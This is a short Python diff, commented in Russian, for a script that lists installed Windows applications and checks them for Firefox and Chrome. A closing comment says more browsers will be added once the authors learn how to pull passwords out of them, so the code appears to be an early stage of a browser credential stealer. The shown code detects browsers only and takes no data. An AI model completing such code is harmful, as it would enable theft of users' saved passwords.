@@ -3,6 +3,10 @@ import winapps
 # Сделать запись установленых приложений в файл
 # Передать установленые браузеры в возврате для обработки
 app_list = []
+chrome = False
+firefox = False
+yandex = False
+opera = False
 
 
 def get_apps():
@@ -16,5 +20,16 @@ def get_apps():
 
 
 def scan_apps():
-    for i in app_list:
-        print(app_list)
+    fire = 'Firefox'
+    file = open('text.txt','r')
+    text = file.read()
+    if fire in text:
+        firefox = True
+    print(firefox)
+    file.close()
+
+    chro = 'Chrome'
+    if chro in text:
+        chrome = True
+    print(chrome)
+#Нужно добавить еще браузеров, но это после того как узнаем как получить из них пароли
